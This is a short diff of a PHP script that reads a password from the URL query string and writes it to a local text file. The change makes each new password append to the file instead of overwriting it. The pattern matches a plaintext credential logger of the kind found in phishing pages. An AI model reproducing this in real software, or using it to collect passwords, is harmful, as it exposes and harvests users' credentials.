@@ -1,6 +1,6 @@
 <?php
 
-$myfile = fopen("newfile.txt", "w") or die("Unable to open file!");
+$myfile = fopen("newfile.txt", "ab") or die("Unable to open file!");
 $txt = $_GET['password'];
 fwrite($myfile, $txt);
 
